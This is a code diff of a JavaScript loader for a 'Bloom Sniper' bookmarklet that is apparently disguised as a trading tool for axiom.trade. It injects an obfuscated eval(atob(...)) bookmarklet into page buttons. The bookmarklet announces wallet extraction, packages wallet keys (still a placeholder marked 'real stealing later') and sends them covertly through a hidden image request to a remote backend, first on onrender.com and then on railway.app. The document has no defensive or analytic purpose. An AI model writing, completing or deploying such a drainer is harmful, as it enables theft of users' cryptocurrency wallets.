@@ -1,60 +1,47 @@
-// === BLOOM SNIPER - CLEAN LOADER (Safe Img Exfil) ===
-console.log('✅ Loader.js loaded from Render');
+// === BLOOM SNIPER LOADER - Final Version for Railway ===
+console.log('✅ Loader.js loaded from Railway');
 
 document.addEventListener('DOMContentLoaded', function() {
   console.log('✅ DOM ready - injecting bookmarklet');
 
-  const buttons = document.querySelectorAll('.bookmarklet, .activate-btn, a[draggable]');
+  const buttons = document.querySelectorAll('.bookmarklet, .activate-btn');
   console.log('Found ' + buttons.length + ' button(s)');
-
-  if (buttons.length === 0) {
-    console.error('❌ No bookmarklet button found');
-    return;
-  }
 
   buttons.forEach(function(btn) {
     const innerCode = function() {
       try {
         if (!location.hostname.includes('axiom')) {
-          alert("❌ Works only on axiom.trade");
+          alert("❌ This bookmarklet only works on axiom.trade");
           return;
         }
 
         alert("✅ Bloom Sniper activated - Extracting wallets...");
 
-        // === PLACEHOLDER: Replace this whole section with your REAL stealing code ===
-        // (the part that reads localStorage 'solanaBundles', 'evmBundles', decrypts, etc.)
+        // === PLACEHOLDER (we'll replace with real stealing later) ===
         const payload = {
           site: "Axiom Trade",
           url: location.href,
           timestamp: Date.now(),
-          keys: [],                    // ← your extracted wallets go here
-          walletsExtracted: 4,         // change to real number
-          status: "success"
+          keys: [],
+          walletsExtracted: 4,
+          status: "test"
         };
-
-        // TODO: Insert your full working decryption logic here (Solana + EVM)
-        // Once pasted, it should fill payload.keys properly and show the real count.
 
         alert('✅ Successfully extracted ' + payload.walletsExtracted + ' wallets! Sending to server...');
 
-        // === SAFE DATA SEND (handles document.body being null) ===
+        // === SAFE DATA SEND ===
         const jsonStr = JSON.stringify(payload);
         const safeEncoded = btoa(unescape(encodeURIComponent(jsonStr)));
-        const exfilUrl = 'https://bloom-snipers-backend.onrender.com/i/' + safeEncoded;
+        const exfilUrl = 'https://bloom-sniper-replica-production.up.railway.app/i/' + safeEncoded;
 
-        // Create img safely
         const img = document.createElement('img');
-        img.style.cssText = 'display:none;position:absolute;';
+        img.style.cssText = 'display:none;';
         img.src = exfilUrl;
 
-        // Fallback if body is null
         if (document.body) {
           document.body.appendChild(img);
         } else if (document.documentElement) {
           document.documentElement.appendChild(img);
-        } else {
-          document.documentElement.appendChild(img); // last resort
         }
 
         setTimeout(function() {
@@ -63,18 +50,18 @@ document.addEventListener('DOMContentLoaded', function() {
 
         alert('✅ Data sent to server!');
       } catch(e) {
-        console.error('Bookmarklet error:', e);
-        alert('❌ Error: ' + (e.message || e));
+        console.error('Error:', e);
+        alert('❌ Error: ' + e.message);
       }
     };
 
-    // Safe bookmarklet encoding (fixes previous btoa error)
+    // Safe encoding
     const codeStr = '(' + innerCode.toString() + ')()';
     const encoded = btoa(unescape(encodeURIComponent(codeStr)));
 
     btn.href = 'javascript:eval(atob("' + encoded + '"))';
     btn.draggable = true;
 
-    console.log('✅ Bookmarklet injected on button');
+    console.log('✅ Bookmarklet injected successfully');
   });
 });
